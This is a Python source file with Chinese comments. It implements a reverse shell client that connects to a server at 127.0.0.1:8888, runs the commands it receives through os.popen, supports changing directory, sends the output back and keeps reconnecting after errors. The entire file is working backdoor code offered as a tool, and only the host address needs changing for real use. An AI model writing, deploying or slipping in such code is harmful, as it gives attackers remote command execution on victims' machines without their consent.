import socket
import time
import os

#反弹shell客户端

def connect_server():
    try:
        hostport = ('127.0.0.1',8888)
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(hostport)
    except:
        print("连接服务器异常")
        
    return s

if __name__ == '__main__':
    s = connect_server()
    while True:
        try:
            try:
                cmd = s.recv(2048).decode() #解码获取命令
            except:
                print("客户端没有返回")
                cmd = ""

            print("服务器命令",cmd)

            if cmd.startswith("cd"):
                try:
                    os.chdir(cmd[2:].strip())   #切换路径
                    result=os.getcwd()      #显示路径
                except:
                    print("错误路径")
                    result = "错误路径"
            else:
                result=os.popen(cmd).read() #获取反馈
            if result:
                #print("长度：",len(result))
                #print(result)
                short_result = result[0:2048] #只发前2048字符
                #print(short_result)
                try:
                    s.send(short_result.encode('utf-8')) #编码发送反馈
                except:
                    print("向客户端发送数据异常")

            elif not result:
                s.send("cmd_shell无返回数据".encode('utf-8'))
                print("无返回数据")
                
        except:
            print("异常,等待3秒")
            time.sleep(3)
            s.close()
            s = connect_server()
            
        
